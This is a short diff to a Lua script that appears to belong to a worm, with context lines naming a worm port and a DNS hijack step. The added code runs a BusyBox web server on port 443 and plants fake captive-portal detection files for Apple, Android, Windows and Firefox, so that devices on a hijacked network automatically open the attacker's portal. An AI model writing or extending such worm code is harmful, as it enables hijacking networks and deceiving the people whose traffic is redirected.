@@ -339,6 +339,21 @@ local function setup_captive_portal()
     log("WARNING: Could not bind port 80 — portal on " .. WORM_PORT .. " only")
   end
 
+  -- Start httpd on port 443 — HTTPS gets fast error instead of hanging
+  -- BusyBox httpd doesn't do TLS, but connections won't time out
+  exec(bb .. " httpd -p 443 -h /tmp/www -c /dev/null 2>/dev/null")
+  log("httpd on port 443 (HTTPS fast-fail)")
+
+  -- Create OS captive portal detection trigger files
+  -- Return wrong content so OS detects portal and auto-pops
+  for _, fname in ipairs({
+    "hotspot-detect.html", "generate_204",
+    "connecttest.txt", "canonical.html", "success.txt"
+  }) do
+    exec("printf 'portal' > /tmp/www/" .. fname)
+  end
+  log("Portal detection files created (Apple/Android/Win/FF)")
+
   -- ---------------------------------------------------------------
   -- DNS HIJACK — dnsmasq with config file (avoids ash ~80 char truncation)
   -- ---------------------------------------------------------------
